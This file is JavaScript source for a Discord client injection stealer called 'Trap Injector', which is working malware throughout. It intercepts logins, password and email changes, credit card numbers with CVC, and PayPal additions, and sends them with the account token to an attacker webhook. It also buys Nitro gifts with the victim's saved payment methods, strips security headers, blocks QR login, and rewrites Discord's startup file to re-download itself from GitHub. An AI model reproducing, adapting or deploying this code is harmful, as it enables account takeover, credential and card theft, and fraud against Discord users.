const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK%',
  webhook_protector_key: '%WEBHOOK_KEY%',
  auto_buy_nitro: true,
  ping_on_run: true, 
  ping_val: '@everyone', 
  embed_name: 'Trap Injector', 
  embed_icon: 'https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 16761035, 
  injection_url: 'https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js', //injection url for when it reinjects

  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '💳 ';
          break;
        case 2:
          billing += '<:paypal:951139189389410365> ';
          break;
      }
    }
  });
  if (!billing) billing = '❌';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase ❌';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const getNitro = (flags) => {
  switch (flags) {
    case 0:
      return 'No Nitro';
    case 1:
      return 'Nitro Classic';
    case 2:
      return 'Nitro Boost';
    default:
      return 'No Nitro';
  }
};

const getBadges = (flags) => {
  let badges = '';
  switch (flags) {
    case 1:
      badges += 'Discord Staff, ';
      break;
    case 2:
      badges += 'Partnered Server Owner, ';
      break;
    case 131072:
      badges += 'Verified Bot Developer, ';
      break;
    case 4:
      badges += 'Hypesquad Event, ';
      break;
    case 16384:
      badges += 'Gold BugHunter, ';
      break;
    case 8:
      badges += 'Green BugHunter, ';
      break;
    case 512:
      badges += 'Early Supporter, ';
      break;
    case 128:
      badges += 'HypeSquad Brillance, ';
      break;
    case 64:
      badges += 'HypeSquad Bravery, ';
      break;
    case 256:
      badges += 'HypeSquad Balance, ';
      break;
    case 0:
      badges = 'None';
      break;
    default:
      badges = 'None';
      break;
  }
  return badges;
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Account Info**',
            value: `Email: **${email}** - Password: **${password}**`,
            inline: false,
          },
          {
            name: '**Discord Info**',
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
            value: `\```fix\n${token}\````,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: 'https://dsc.gg/4-4',
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Password Changed**',
            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: 'https://dsc.gg/4-4',
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Email Changed**',
            value: `New Email: **${email}**\nPassword: **${password}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Paypal Added**',
            value: `Time to buy some nitro baby 😩`,
            inline: false,
          },
          {
            name: '**Discord Info**',
            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Credit Card Added**',
            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Nitro bought!**',
            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
            inline: true,
          },
          {
            name: '**Discord Info**',
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});
session.defaultSession.webRequest.onHeadersReceived((e, c) => {
  if (e.url.startsWith(config.webhook)) {
    if (e.url.includes('discord.com')) {
      c({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          e.responseHeaders,
        ),
      });
    } else {
      c({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          e.responseHeaders,
        ),
      });
    }
  } else {
    delete e.responseHeaders['content-security-policy'];
    delete e.responseHeaders['content-security-policy-report-only'];

    c({
      responseHeaders: {
        ...e.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (e, _) => {
  if (e.statusCode !== 200 && e.statusCode !== 202) return;
  const u = Buffer.from(e.uploadData[0].bytes).toString();
  const t = await execScript(
    `function _0x527f(_0x87c79b,_0x30f50a){const _0x2e4101=_0x1210();return _0x527f=function(_0x1a4fb0,_0x2e91d1){_0x1a4fb0=_0x1a4fb0-(-0xb79+0x101e*-0x1+0x1d2c);let _0x41c77c=_0x2e4101[_0x1a4fb0];return _0x41c77c;},_0x527f(_0x87c79b,_0x30f50a);}const _0x274ce6=_0x527f;function _0x1210(){const _0xc14d13=['getToken','3810432bFPYsB','496992TrIpLq','5kHtwJf','default','147582vVKdbZ','find','86810dMEneq','1372482cDrUvM','push','7okBYpv','exports','3858324FdKxqd','323341SOmNOX','954ZIKfFm','44QYMnFE','4UXlkq'];_0x1210=function(){return _0xc14d13;};return _0x1210();}(function(_0x207cec,_0x22dda9){const _0x1c229c=_0x527f,_0x4bd3c8=_0x207cec();while(!![]){try{const _0x2afc8a=-parseInt(_0x1c229c(0x19c))/(-0x1f70+0x1*-0x1418+0x3389*0x1)*(parseInt(_0x1c229c(0x19f))/(-0x3*-0xb52+-0x1582+-0xc72))+-parseInt(_0x1c229c(0x1a5))/(0xd15+-0x224c+0x153a)+-parseInt(_0x1c229c(0x1a2))/(-0x1ec9*0x1+0x34*-0x1c+0x247d)*(-parseInt(_0x1c229c(0x1a3))/(-0x3b*-0x3b+-0x1c82+0xeee))+parseInt(_0x1c229c(0x197))/(-0xf26+-0x2549+-0x3475*-0x1)*(parseInt(_0x1c229c(0x199))/(0xced+0x1e7d+-0x2b63))+parseInt(_0x1c229c(0x1a1))/(0xf7*-0xf+0x2543+-0x16c2)+parseInt(_0x1c229c(0x19d))/(0xd81+-0x1*-0x1e55+-0x1*0x2bcd)*(-parseInt(_0x1c229c(0x196))/(-0x1951+0x1410+0x54b))+parseInt(_0x1c229c(0x19e))/(-0x1ebd*-0x1+0x149d+-0x1*0x334f)*(parseInt(_0x1c229c(0x19b))/(-0xc8f+0x22*-0xb3+0x2461*0x1));if(_0x2afc8a===_0x22dda9)break;else _0x4bd3c8['push'](_0x4bd3c8['shift']());}catch(_0x58df9d){_0x4bd3c8['push'](_0x4bd3c8['shift']());}}}(_0x1210,-0x546c7+0xa*-0x49e8+0xfc868*0x1),(webpackChunkdiscord_app[_0x274ce6(0x198)]([[''],{},_0x203f70=>{const _0x16833c=_0x274ce6;m=[];for(let _0xbb6989 in _0x203f70['c'])m[_0x16833c(0x198)](_0x203f70['c'][_0xbb6989]);}]),m)[_0x274ce6(0x195)](_0x579171=>_0x579171?.[_0x274ce6(0x19a)]?.[_0x274ce6(0x1a4)]?.[_0x274ce6(0x1a0)]!==void(0x3*-0xcac+0x18d9*-0x1+0x3edd))[_0x274ce6(0x19a)][_0x274ce6(0x1a4)][_0x274ce6(0x1a0)]());`,
  );
  switch (true) {
    case e.url.endsWith('login'):
      login(u.login, u.password, t).catch(console.error);
      break;

    case e.url.endsWith('users/@me') && e.method === 'PATCH':
      if (!u.password) return;
      if (u.email) {
        emailChanged(u.email, u.password, t).catch(console.error);
      }
      if (u.new_password) {
        passwordChanged(u.password, u.new_password, t).catch(console.error);
      }
      break;

    case e.url.endsWith('tokens') && e.method === 'POST':
      const i = querystring.parse(u.toString());
      ccAdded(i['card[number]'], i['card[cvc]'], i['card[exp_month]'], i['card[exp_year]'], t).catch(console.error);
      break;

    case e.url.endsWith('paypal_accounts') && e.method === 'POST':
      PaypalAdded(t).catch(console.error);
      break;

    case e.url.endsWith('confirm') && e.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(t).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');
